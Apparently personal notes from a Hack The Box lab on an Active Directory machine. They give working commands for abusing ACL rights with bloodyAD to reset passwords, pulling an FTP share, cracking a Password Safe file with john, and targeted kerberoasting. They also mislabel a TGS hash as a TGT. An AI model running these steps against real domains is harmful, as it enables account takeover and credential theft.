- Lets move to bloodhound
```python
 rusthound-ce --domain administrator.htb -u Olivia -p 'ichliebedich' --zip
```
- The user `olivia` has genericAll rights over the user `Michael`

![[Pasted image 20260919093605.png]]

- Which means we can perform targetedkerberoasting
- we can change Michael's password using `bloodyad`
```python
 bloodyad --host dc.administrator.htb -d administrator.htb -u Olivia -p ichliebedich set password michael 'Leahmic10!)'
[+] Password changed successfully!
```

- And user `michael` has `ForceChangePassword` over the user `Benjamin`
![[Pasted image 20260919094230.png]]
- Changed the password using `bloodyad`
```python
 bloodyad --host dc.administrator.htb -d administrator.htb -u Michael -p 'Leahmic10!)' set password Benjamin 'Nimajneb10!)'
[+] Password changed successfully!
```

- Upon further inspection, we found that the user `benjamin` is a member of `share moderators` group.
- Lets try accessing `FTP` share as the user `Benjamin` :

```python
wget -m --no-passive-ftp 'ftp://benjamin:Nimajneb10%21%29@10.129.63.228/'
```
![[Pasted image 20260919101759.png]]

- Success!
![[Pasted image 20260919102103.png]]
- we found a `Backup.psafe3` file, lets crack it using john

```python
pwsafe2john Backup.psafe3 > Backup.psafe3.hash
john --wordlist=/usr/share/wordlists/rockyou.txt Backup.psafe3.hash

✘ 1 $ john Backup.psafe3.hash --show
Backu:tekieromucho
```

## Opening the password safe
- lets first install and use the password safe refer to [[21. htb-password-attacks-writeup]] for reference.

![[Pasted image 20260919103042.png]]

- Double tapping these users gives access to their passwords, lets see if they work
- Emily is the most interesting user here

**Emily creds**

```python
Emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
- lets test if they work
- They do!
- ![[Pasted image 20260919114808.png]]

- From bloodhound, we know emily has `genericwrite` over Ethan
![[Pasted image 20260919114852.png]]

- we used `bloodyad` to set an spn to the user Ethan and then requested his TGT
```python
bloodyad --host dc.administrator.htb \
  -d administrator.htb \
  -u emily \
  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \
  set object ethan servicePrincipalName -v 'fake/http'
[+] ethan's servicePrincipalName has been updated
```

getting ethan's tgt:

```python
 GetUserSPNs.py -dc-ip 10.129.63.228 -request-user ethan 'administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 
 #Got it 
 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$7bef0d20330232fccb1ac37698742463$
```
